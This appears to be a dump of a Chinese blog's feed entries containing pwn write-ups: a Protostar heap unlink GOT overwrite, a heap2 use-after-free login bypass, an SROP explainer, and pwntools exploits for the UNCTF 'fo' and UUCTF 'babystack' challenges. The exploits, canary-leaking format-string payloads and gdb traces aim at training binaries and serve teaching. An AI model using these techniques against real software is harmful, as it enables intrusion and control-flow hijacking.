0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0xffffffff      0xffffffff
0x804c050:      0xfffffffc      0xfffffffc      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 5, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:22
22      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x804890a &lt;main+129&gt;:   mov    0x1c(%esp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0xffffffff      0xffffffff
0x804c050:      0xfffffffc      0xfffffffc      0xffffffff      0x0804b11c
0x804c060:      0x0804c040      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 6, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:24
24      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 执行free与unlink </p>
<p><img src="/img/1731911188062.png"></p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) c
Continuing.
0x8048916 &lt;main+141&gt;:   mov    0x18(%esp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0x0804b11c      0xfffffff8
0x804c050:      0xfffffffc      0xfffffffc      0xfffffff9      0x0804b194
0x804c060:      0x0804b194      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 7, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:25
25      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x8048922 &lt;main+153&gt;:   mov    0x14(%esp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0x0804b11c      0xfffffff8
0x804c050:      0xfffffffc      0xfffffffc      0xfffffff9      0x0804b194
0x804c060:      0x0804b194      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 8, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:26
26      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x804892e &lt;main+165&gt;:   movl   $0x804ac27,(%esp)
0x804c000:      0x00000000      0x00000029      0x0804c028      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0x0804b11c      0xfffffff8
0x804c050:      0xfffffffc      0xfffffffc      0xfffffff9      0x0804b194
0x804c060:      0x0804b194      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
28      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">(gdb) x&#x2F;x 0x804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804c040<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> puts函数的got表地址成功被覆盖成了winner函数的地址 </p>
<p><img src="/img/1731911306453.png"></p>
<p> 这里推荐<a href="https://www.youtube.com/watch?v=HWhzH--89UQ&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=31">LiveOverflow</a>博主的视频教程 </p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场7 heap two</title>
    <url>/2024/1117fb1e.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场7-heap-two"><a href="#Pwn-protostar靶场7-heap-two" class="headerlink" title="Pwn-protostar靶场7 heap two"></a>Pwn-protostar靶场7 heap two</h1><h2 id="heap2"><a href="#heap2" class="headerlink" title="heap2"></a>heap2</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">struct</span> <span class="token class-name">auth</span> <span class="token punctuation">&#123;</span>  #定义了一个名为 auth 的结构体
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  #定义了一个名叫name的变量，能存储<span class="token number">32</span>字节数据
  <span class="token keyword">int</span> auth<span class="token punctuation">;</span>  #定义了一个整数变量auth
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">auth</span> <span class="token operator">*</span>auth<span class="token punctuation">;</span>  #auth 指针用来指向 <span class="token keyword">struct</span> <span class="token class-name">auth</span> 类型的对象
<span class="token keyword">char</span> <span class="token operator">*</span>service<span class="token punctuation">;</span>  #定义了一个service指针

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  #主函数
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  #定义了一个名叫line的变量，能存储<span class="token number">128</span>字节数据

  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  #一个无限循环
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[ auth = %p, service = %p ]\n"</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> service<span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出auth 和 service 指针的当前值

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>  #获取我们输入，如果读取失败就会退出
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"auth "</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  #如果输入auth，进入<span class="token keyword">if</span>语句 
      auth <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>auth<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给auth 结构体分配内存
      <span class="token function">memset</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>auth<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #将内存初始化为零
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  #line <span class="token operator">+</span> <span class="token number">5</span>（即 <span class="token string">"auth "</span> 后面的字符串）的长度小于<span class="token number">31</span>字符
        <span class="token function">strcpy</span><span class="token punctuation">(</span>auth<span class="token operator">-></span>name<span class="token punctuation">,</span> line <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #它将被复制到 auth 结构体的 name 字段
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"reset"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  #如果输入是 <span class="token string">"reset"</span>
      <span class="token function">free</span><span class="token punctuation">(</span>auth<span class="token punctuation">)</span><span class="token punctuation">;</span>  #释放掉auth结构体的内存
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"service"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  #如果输入以 <span class="token string">"service"</span> 开头
      service <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #程序将使用 strdup 函数复制 <span class="token string">"service"</span> 后面的字符串，并将 service 指针指向这个新分配的副本
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"login"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  #如果输入是 <span class="token string">"login"</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>auth<span class="token operator">-></span>auth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  #程序将检查 auth 结构体的 auth 字段
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have logged in already!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #如果 auth 字段非零，程序会打印一条消息表示用户已经登录
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"please enter your password\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #否则，程序提示用户输入密码
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="什么是use-after-free漏洞？"><a href="#什么是use-after-free漏洞？" class="headerlink" title="什么是use-after-free漏洞？"></a>什么是use-after-free漏洞？</h3><p>Use-After-Free（UAF）漏洞是一种内存安全漏洞，发生在程序释放了一块内存之后再次错误地使用（访问或操作）这块内存的情况。这种漏洞通常出现在动态内存管理的环境中，尤其是在使用手动内存管理（如C和C++语言）的程序中较为常见。UAF漏洞可能导致程序行为异常、数据损坏、信息泄露，甚至允许攻击者执行任意代码。</p>
<h3 id="UAF漏洞发生的条件"><a href="#UAF漏洞发生的条件" class="headerlink" title="UAF漏洞发生的条件"></a>UAF漏洞发生的条件</h3><p>内存释放：程序通过某种机制（例如C语言的free()函数）释放了一块动态分配的内存。<br>错误重用：在该内存被释放后，程序中的某个部分尝试再次访问或使用这块已释放的内存。<br>内存再分配：操作系统或内存管理器可能将已释放的内存块重新分配给其他请求，导致原先的引用变得不可预测或危险。</p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>buffer <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 分配100字节的内存</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token string">"sensitive data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将敏感数据复制到分配的内存中</span>
<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 释放内存</span>

<span class="token comment">// ... 程序的其他部分</span>

<span class="token comment">// 错误地重新使用了已释放的内存</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 尝试打印已释放内存中的数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个例子中，buffer指针首先指向了一块分配的内存，存储了一些敏感数据。随后，这块内存被释放，理应不再被访问。然而，程序后面的部分错误地尝试访问这块已经释放的内存，试图打印它的内容。这个操作可能导致未定义行为，包括打印出随机数据、导致程序崩溃或更糟糕的情况 </p>
<h3 id="程序动态调试"><a href="#程序动态调试" class="headerlink" title="程序动态调试"></a>程序动态调试</h3><p>这是一个类似于登陆程序的程序，我们可以先看看程序的参数，运行程序，随便往堆里存放一些数据，然后登陆</p>
<p><img src="/img/1731845088917.png"></p>
<p> 图中可以看到auth结构体的堆地址是0x804c008，由于程序检查auth结构体指针的auth成员的值。这个成员是一个整型（int），用来表示用户是否已经认证：非零值表示已认证，零值表示未认证。<br>如果auth-&gt;auth的值为非零（即用户已经通过认证），则输出用户以登陆 </p>
<p><img src="/img/1731845291604.png">这个程序存在use-after-free漏洞，我们在输入reset释放auth结构体内存时，指针并未重置为0，这个auth结构体的指针还是指向0X804c008 </p>
<p><img src="/img/1731845924997.png"></p>
<p><img src="/img/1731845961029.png"></p>
<p>输入service参数会执行strdup函数，简单来说，这个函数的作用是复制字符串，然后会自动调用mallco函数来分配内存空间，并返回指向这个新分配内存的指针，也可以使用free函数释放调内存 </p>
<p><img src="/img/1731845994377.png"></p>
<p> 随便输入一些值，可以看见service的指针指向了0x804c008 </p>
<p><img src="/img/1731846057667.png"></p>
<p>为什么service的指针和auth的指针指向的是同一个地址呢？聪明的同学可能已经知道了，我们上一个步骤是执行了reset参数，释放了auth结构体的空间，现在又执行了service参数，上面说过，输入service参数会执行strdup函数，简单来说，这个函数的作用是复制字符串，然后会自动调用mallco函数来分配内存空间，并返回指向这个新分配内存的指针，也可以使用free函数释放调内存</p>
<p>由于释放了auth结构体的空间，程序给我们分配空间时，使用了这个空闲的空间，现在auth和service就指向了同一个地址，这就是use-after-free漏洞，漏洞点就发生在这</p>
<p>假设现在有一个内存空间A，空间A是由root用户创建的，可以以最高权限执行命令，现在空间A被free掉了，被程序标记为空闲空间，现在user用户要创建一个内存空间，由于A空间被标记为空闲空间，所以程序会把A空间分配给user用户，我们就可以用user用户操作root用户的空间，执行越权的操作，这就是UAF（use-after-free）漏洞</p>
<p>现在我们用gdb调试程序，用auth参数执行一次分配内存空间的操作</p>
<p><img src="/img/1731846239241.png"></p>
<pre class="line-numbers language-none"><code class="language-none">info proc mappings<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731846275602.png"></p>
<p> 可以看到，堆空间为0x804c000-0x804d000，现在我们查看堆空间的内容 </p>
<p><img src="/img/1731846367050.png"></p>
<p> 我们也可以使用print参数详细显示存放的内容<img src="/img/1731846590722.png"></p>
<p>现在可以看到我们输入的字符串A，和后面的身份验证，auth = 0 </p>
<p>我们在printf函数处下一个断点，然后用commands参数在每一步操作停下来后，自动的运行我们设置的命令，可以更方便的展示堆空间的操作 </p>
<p><img src="/img/1731846696741.png"></p>
<pre class="line-numbers language-none"><code class="language-none">&gt;echo -----------------------------------------------\n
&gt;x&#x2F;20wx 0x804c000
&gt;echo auth-------------------------------------------\n
&gt;print *auth
&gt;echo service----------------------------------------\n
&gt;print *service
&gt;echo -----------------------------------------------\n
&gt;continue
&gt;end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731846956798.png"></p>
<p><img src="/img/1731846969807.png"></p>
<p> 运行程序，使用auth参数来分配第一个堆空间</p>
<p><img src="/img/1731847047365.png"></p>
<p><img src="/img/1731847086871.png"></p>
<p>现在又有一个新问题，为什么auth只有8个字节的空间，不应该是32个字节+4字节整数=36字节空间吗？ </p>
<p><img src="/img/1731847108265.png"></p>
<p>这是因为结构体为auth，整数也叫auth，而结构体auth的指针又叫auth，程序计算auth的大小时，计算的是auth变量的大小，而不是struct auth的大小 </p>
<p><img src="/img/1731847216552.png"></p>
<p>因此，auth被分配到的空间只有4字节大小，malloc函数会将其对齐到8字节</p>
<p>现在来看看free函数是怎么运行的，输入reset</p>
<p><img src="/img/1731847658622.png"></p>
<p> 可以看到，我们之前写入的字符串都被清空了，但是auth指针依然存在 </p>
<p><img src="/img/1731847687895.png"></p>
<p> 现在我们用service参数写入一些字符串 </p>
<p><img src="/img/1731847718478.png"></p>
<p>可以看到，auth的值也变成了AAA</p>
<p>身份验证（int auth）的地址是第32个字节后的四个字节</p>
<p><img src="/img/1731847791068.png"></p>
<p>也就是图中选中的地方，刚好分配三次service的空间就能覆盖，刚刚我们以及执行了一次，现在我们再执行两次service </p>
<p><img src="/img/1731847839509.png"></p>
<p><img src="/img/1731847859821.png"></p>
<p> 现在身份验证的值变成了CCC，已经不为0了，现在我们输入login即可 </p>
<p><img src="/img/1731847903399.png"></p>
<p><strong>成功登陆</strong></p>
<p>我们也可以直接用service参数输入<strong>36个A</strong>来覆盖身份验证的地址</p>
<p>重新运行程序</p>
<p><img src="/img/1731848084606.png"></p>
<p><img src="/img/1731848131384.png"></p>
<p><img src="/img/1731848164432.png"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>SROP</title>
    <url>/2021/06289984.html</url>
    <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
<p>Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&gt;rt_sigreturn</p>
<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息</p>
<p>常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态</p>
<p>因为是暂时被挂起，所以系统会保留该进程的上下文  (部分内容摘自ctf-wiki)</p>
<pre><code>将所有的寄存器压入栈中，以及signal信息和指向sigreturn的系统调用地址在栈顶上放置rt_sigreturn
</code></pre>
<p>此时栈上的内存分布：<br><img src="/img/14487175105930.png!small.jpg"></p>
<p>这一段内存也被称为<strong>Signal Frame</strong></p>
<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><pre><code>Signal Frame 被放置在用户进程的内存空间中，也就说Signal Frame是可以读写的

在恢复Signal信号的时候没有检测，也就是说我们可以通过改变Signal Frame中的信息来劫持控制流
</code></pre>
<p>例如：<br>  1  | rax = 59//对应59号系统调用-&gt; exceve<br>  2  | rdi = ‘/bin/sh’<br>  3  | rsi = 0<br>  4  | rdx = 0</p>
<p>这样就能进行一个最简单的Srop</p>
<h2 id="Srop链"><a href="#Srop链" class="headerlink" title="Srop链"></a>Srop链</h2><p>有时候我们希望执行一系列的操作,此时可以通过syscall ret;这个gadget去串联起我们我们的Srop链</p>
<p>执行完一个SignalFrame接着执行下一个SignalFrame。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>unctf-fo</title>
    <url>/2022/01214814.html</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="UNCTF——fo"><a href="#UNCTF——fo" class="headerlink" title="UNCTF——fo"></a>UNCTF——fo</h2><p>我真是个傻逼！这题目就是拿来自己打醒自己的，比赛卡了一晚上，一度怀疑是自己字符串漏洞没学好，研究一晚格式化字符串，结果wp出来一看，计算偏移量搞错，我真是个大傻逼！！！</p>
<p>检查保护机制，64位，开NX和canary</p>
<p><img src="/img/1643120080074.png" alt="1643120080074"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目里printf函数，可以直接格式化字符串漏洞溢出canary地址，然后覆盖夺权，思路很简单。</p>
<p><img src="/img/1643120093467.png" alt="1643120093467"></p>
<p>但我是万万没想到啊，栽在自己手里</p>
<p><img src="/img/1643120109339.png" alt="1643120109339"></p>
<p>从头到尾，一共0x58的大小，我偏偏忘掉减canary地址，以至于整个题卡住，我是傻逼！！！</p>
<p>最后就不用多说了</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#context.binary='fo'</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

<span class="token comment">#r=process('./fo')</span>
r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node2.hackingfor.fun"</span><span class="token punctuation">,</span><span class="token number">36041</span> <span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./fo'</span><span class="token punctuation">)</span>

rdi<span class="token operator">=</span><span class="token number">0x4008e3</span>
backdoor<span class="token operator">=</span><span class="token number">0x40080D</span>
main<span class="token operator">=</span><span class="token number">0x400823</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"you?"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'%17$p'</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
<span class="token comment">#r.recvuntil("...")</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>总的来说，题目很好，下次不会再犯傻逼错误了，省赛加油！</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>UUCTF writeup</title>
    <url>/2023/0530b47d.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="UUCTF-writeup"><a href="#UUCTF-writeup" class="headerlink" title="UUCTF writeup"></a>UUCTF writeup</h1><h3 id="writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配"><a href="#writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配" class="headerlink" title="writer:Pr0b1em(小菜鸡二进制选手，目标全栈选手，不配)"></a>writer:Pr0b1em<del>(小菜鸡二进制选手，目标全栈选手，不配)</del></h3><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p>下载附件，先检查保护机制，只开了NX，64位文件</p>
<p><img src="/img/1666613003904.png" alt="1666613003904"></p>
<p>拖入IDA查看，分别查看main函数和字符串，找到关键字符串system和bin/sh，同时发现了vuln函数，继续跟进</p>
<p><img src="/img/1666613080677.png" alt="1666613080677"></p>
<p><img src="/img/1666613062494.png" alt="1666613062494"></p>
<p><img src="/img/1666613139782.png" alt="1666613139782"></p>
<p>发现buf此处，其中存在栈溢出，同时发现back_door函数，现成直接用 </p>
<p><img src="/img/1666613319147.png" alt="1666613319147"></p>
<p>构造脚本</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#r=remote("",)</span>
r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>

backdoor<span class="token operator">=</span><span class="token number">0x400734</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What's your name?"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h3><p><strong>花式栈溢出</strong></p>
<p>检查保护机制，开了NX和PIE,说明基地址随机，估计得碰运气</p>
<p><img src="/img/1666614235498.png" alt="1666614235498"></p>
